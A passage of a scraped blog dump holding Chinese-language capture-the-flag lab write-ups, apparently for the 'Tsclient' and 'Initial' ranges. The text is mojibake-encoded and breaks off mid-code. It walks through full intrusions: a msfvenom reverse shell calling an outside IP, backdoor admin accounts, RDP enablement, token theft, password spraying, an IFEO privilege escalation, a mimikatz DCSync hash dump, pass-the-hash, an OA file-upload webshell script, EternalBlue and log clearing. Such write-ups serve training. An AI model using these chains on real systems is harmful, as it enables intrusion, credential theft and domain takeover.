172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u0026gt;net user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u0026gt;quser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo è¿™å°æœºå­ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥ä¼ æ–‡ä»¶\nè¿™é‡Œæˆ‘æ˜¯ç”¨ç¬¬ä¸€å°æœºå­(172.22.8.18)ï¼Œå°†æ–‡ä»¶å¤¹C:/xrntkkå…±äº«ç»™(172.22.8.46)\nåœ¨46ä¸ŠWin+Rå¹¶è¾“å…¥\n\\\\172.22.8.18 è¾“å…¥18å…±äº«æ–‡ä»¶çš„è´¦å·å¯†ç å³å¯\næ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup"},{"content":" å‚è€ƒæ–‡ç« \nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\nèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\nFLAG1 fscanæ‰«ä¸€ä¸‹\n./fscan.exe -h 39.99.139.119 ç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\nå…ˆç”¨vshellä¸Šçº¿\nè¯»flagéœ€è¦ææƒ\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\nä¼ ä¸ªlinpeasæ‰«ä¸€ä¸‹\n./linpeas_linux_amd64 \u0026gt; output.txt åœ¨å†å²æ–‡ä»¶ä¸­æ‰¾åˆ°ç–‘ä¼¼è¯»flagçš„å‘½ä»¤\nå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„sudoææƒ\næ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢\nmysql æ˜¯é…ç½®äº† sudo å…å¯†ä½¿ç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ mysql ææƒï¼Œé€šè¿‡mysqlæ‰§è¡Œå‘½ä»¤æ¥è¯»flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- æ¥ä¸‹æ¥æ­ä»£ç†\næŸ¥å†…ç½‘ip\næ¥ç€ä¼ ä¸€ä¸ªfscanæ‰«ä¸€ä¸‹å†…ç½‘\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 æ”¶é›†åˆ°çš„ä¿¡æ¯\n172.22.1.2:DCåŸŸæ§\r172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´\r172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ FLAG2 å…ˆçœ‹ä¿¡å‘¼\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin123\nä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿv2.2.8å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n[Awesome-POC/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md at master Â· Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) å†™é©¬ä¹‹åç›´æ¥è¯»flagå°±è¡Œ\nflag02: 2ce3-4813-87d4- FLAG3 æ°¸æ’ä¹‹è“å¯ä»¥ç”¨msfæ‰“\nç°åœ¨kaliä¸Šç”¨proxychains4ç®€å•é…ä¸ªä»£ç†\nproxychains4 msfconsole\rsearch ms17-010 æœ‰å››ä¸ªä¸åŒçš„æ¨¡å—\nè¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºåˆ©ç”¨èŒƒå›´æ¯”è¾ƒå¹¿\nuse exploit/windows/smb/ms17_010_eternalblue # é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—\rset payload windows/x64/meterpreter/bind_tcp_uuid # è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹\rset RHOSTS 172.22.1.21 # è®¾ç½®é¶æœºçš„ip\rexploit # å‘èµ·æ”»å‡» æˆåŠŸäº†\nmeterpreter \u0026gt; screenshot # æ•è·å±å¹•\rmeterpreter \u0026gt; upload hello.txt c:// #ä¸Šä¼ æ–‡ä»¶\rmeterpreter \u0026gt; download d://1.txt # ä¸‹è½½æ–‡ä»¶\rmeterpreter \u0026gt; shell # è·å–cmd\rmeterpreter \u0026gt; clearev # æ¸…é™¤æ—¥å¿— load kiwi # è°ƒç”¨mimikatzæ¨¡å—\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼) æ‹¿åˆ°Administrator ç”¨æˆ·çš„ hashï¼Œæ¥ç€ä½¿ç”¨ crackmapexec æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° DCåŸŸæ§ ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscanæ‰«ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨vshellä¸Šçº¿\u003c/p\u003e\n\u003cp\u003eè¯»flagéœ€è¦ææƒ\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman æ‹¿åˆ°ç¯å¢ƒ\nä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\næŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\nå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\nhttps://tool.yuanrenxue.cn/decode_obfuscator\nåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\næ„Ÿè§‰æ˜¯æ …æ ï¼Œè§£å¯†æ‹¿åˆ°flag\nLevel 47 BandBomb æ–‡ä»¶ä¸Šä¼ \né™„ä»¶æœ‰æºç \n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = 